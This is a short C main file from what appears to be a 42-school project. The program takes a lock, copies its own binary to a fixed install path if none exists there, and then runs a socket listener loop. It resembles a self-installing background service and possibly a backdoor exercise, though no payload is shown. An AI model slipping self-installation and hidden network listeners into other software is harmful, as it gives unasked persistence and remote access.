/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: dhubleur <dhubleur@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/03/06 19:13:32 by jmaia             #+#    #+#             */
/*   Updated: 2024/06/13 22:37:34 by jmaia            ###   ###               */
/*                                                                            */
/* ************************************************************************** */

#include <stdbool.h>
#include <stdio.h>

#include "daemon.h"
#include "polling.h"

int main(int ac, char **av)
{
	int success;

	(void) ac;

	success = acquire_lock();
	if (! success)
		return (1);

	setup_cleanup();

	//THE ONLY AUTHORISED PRINT
	printf("jmaia dhubleur\n");

	if (access(BIN_PATH, F_OK) != 0)
	{
		success = install(av[0]);
		if (! success)
			return (2);
	}
	
	// daemonize();
	int sockfd = prepare_socket();
	if (sockfd == -1)
		return (3);
	poll_routine(sockfd);
}
